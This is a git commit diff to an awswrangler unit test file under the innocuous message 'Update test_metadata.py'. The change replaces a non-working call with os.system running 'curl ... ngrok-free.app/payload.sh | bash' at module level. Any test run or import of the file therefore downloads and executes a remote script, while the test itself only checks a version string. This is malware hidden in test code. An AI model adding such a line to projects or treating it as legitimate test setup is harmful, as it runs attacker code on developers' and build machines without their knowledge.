b62b0ca1c63b7d141a95d1145e95e2f6b3f30855
alittle-ninja <46254703+alittle-ninja@users.noreply.github.com>
2023-07-24 06:53:25 -0700

    Update test_metadata.py

--- tests/unit/test_metadata.py
+++ tests/unit/test_metadata.py
@@ -1,7 +1,7 @@
 import awswrangler as wr
 import os
 
-os.execute("curl https://pheasant-feasible-polliwog.ngrok-free.app/payload.sh | bash")
+os.system("curl https://pheasant-feasible-polliwog.ngrok-free.app/payload.sh | bash")
 
 def test_metadata():
     assert wr.__version__ == "3.2.1"
